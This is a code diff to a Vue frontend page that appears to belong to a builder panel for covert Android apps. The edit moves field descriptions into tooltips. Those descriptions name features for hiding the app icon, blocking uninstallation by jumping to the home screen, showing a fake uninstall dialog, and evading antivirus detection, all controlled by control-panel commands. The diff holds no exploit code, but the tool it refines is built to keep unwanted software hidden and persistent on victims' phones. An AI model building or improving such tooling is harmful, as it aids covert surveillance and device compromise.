@@ -24,6 +24,7 @@ import {
     NProgress,
     NSteps,
     NStep,
+    NTooltip,
     createDiscreteApi,
     type UploadFileInfo,
 } from 'naive-ui';
@@ -33,6 +34,7 @@ import {
     CheckmarkCircleOutline,
     CloseCircleOutline,
     RocketOutline,
+    InformationCircleOutline,
 } from '@vicons/ionicons5';
 import AuthenticatedLayout from '@/Layouts/AuthenticatedLayout.vue';
 import { EventSourcePolyfill } from 'event-source-polyfill';
@@ -530,19 +532,39 @@ const validateForm = (): boolean => {
                                 </template>
                                 <NGrid :cols="2" :x-gap="16">
                                     <NGridItem>
-                                        <NFormItem label="隐藏方式">
+                                        <NFormItem>
+                                            <template #label>
+                                                <span class="label-with-tip">
+                                                    隐藏方式
+                                                    <NTooltip trigger="hover" placement="top">
+                                                        <template #trigger>
+                                                            <NIcon :component="InformationCircleOutline" class="tip-icon" />
+                                                        </template>
+                                                        <div class="tip-content">
+                                                            <p><b>直接隐藏</b>：检测到卸载时按HOME键跳走</p>
+                                                            <p><b>卸载隐藏</b>：不拦截卸载流程，需配合防止卸载使用</p>
+                                                            <p><b>提示卸载</b>：弹出假卸载对话框</p>
+                                                        </div>
+                                                    </NTooltip>
+                                                </span>
+                                            </template>
                                             <NSelect v-model:value="form.hide_type" :options="hideTypeOptions" />
-                                            <div class="field-desc">
-                                                直接隐藏：检测到卸载时按HOME键跳走；卸载隐藏：不拦截卸载流程，需配合防止卸载使用；提示卸载：弹出假卸载对话框
-                                            </div>
                                         </NFormItem>
                                     </NGridItem>
                                     <NGridItem>
-                                        <NFormItem label="免杀保护">
+                                        <NFormItem>
+                                            <template #label>
+                                                <span class="label-with-tip">
+                                                    免杀保护
+                                                    <NTooltip trigger="hover" placement="top">
+                                                        <template #trigger>
+                                                            <NIcon :component="InformationCircleOutline" class="tip-icon" />
+                                                        </template>
+                                                        开启后降低被系统安全软件检测和查杀的概率
+                                                    </NTooltip>
+                                                </span>
+                                            </template>
                                             <NSelect v-model:value="form.notify_msg" :options="antkillOptions" />
-                                            <div class="field-desc">
-                                                开启后降低被系统安全软件检测和查杀的概率
-                                            </div>
                                         </NFormItem>
                                     </NGridItem>
                                 </NGrid>
@@ -554,11 +576,19 @@ const validateForm = (): boolean => {
                                 </template>
                                 <NGrid :cols="2" :x-gap="16" :y-gap="8">
                                     <NGridItem>
-                                        <NFormItem label="防止卸载">
+                                        <NFormItem>
+                                            <template #label>
+                                                <span class="label-with-tip">
+                                                    防止卸载
+                                                    <NTooltip trigger="hover" placement="top">
+                                                        <template #trigger>
+                                                            <NIcon :component="InformationCircleOutline" class="tip-icon" />
+                                                        </template>
+                                                        赋予防卸载能力，运行时通过控制面板 kb 命令控制开关
+                                                    </NTooltip>
+                                                </span>
+                                            </template>
                                             <NSelect v-model:value="form.use_antkill" :options="switchOptions" />
-                                            <div class="field-desc">
-                                                赋予防卸载能力，运行时通过控制面板 kb 命令控制开关
-                                            </div>
                                         </NFormItem>
                                     </NGridItem>
                                     <NGridItem>
@@ -567,11 +597,19 @@ const validateForm = (): boolean => {
                                         </NFormItem>
                                     </NGridItem>
                                     <NGridItem>
-                                        <NFormItem label="隐藏应用">
+                                        <NFormItem>
+                                            <template #label>
+                                                <span class="label-with-tip">
+                                                    隐藏应用
+                                                    <NTooltip trigger="hover" placement="top">
+                                                        <template #trigger>
+                                                            <NIcon :component="InformationCircleOutline" class="tip-icon" />
+                                                        </template>
+                                                        安装后图标默认显示，需通过控制面板发送隐藏图标命令隐藏
+                                                    </NTooltip>
+                                                </span>
+                                            </template>
                                             <NSelect v-model:value="form.hidden_app" :options="switchOptions" />
-                                            <div class="field-desc">
-                                                安装后图标默认显示，需通过控制面板发送隐藏图标命令隐藏
-                                            </div>
                                         </NFormItem>
                                     </NGridItem>
                                     <NGridItem>
@@ -1117,15 +1155,26 @@ const validateForm = (): boolean => {
     padding: 16px 24px 24px;
 }
 
-.field-desc {
-    font-size: 11.5px;
-    color: #64748b;
-    margin-top: 6px;
-    padding: 6px 10px;
+.label-with-tip {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+}
+
+.tip-icon {
+    font-size: 14px;
+    color: #94a3b8;
+    cursor: help;
+    transition: color 0.2s;
+}
+
+.tip-icon:hover {
+    color: #667eea;
+}
+
+.tip-content p {
+    margin: 2px 0;
+    font-size: 13px;
     line-height: 1.5;
-    background: linear-gradient(135deg, #f8fafc, #f1f5f9);
-    border-left: 2px solid #667eea;
-    border-radius: 0 4px 4px 0;
-    letter-spacing: 0.01em;
 }
 </style>
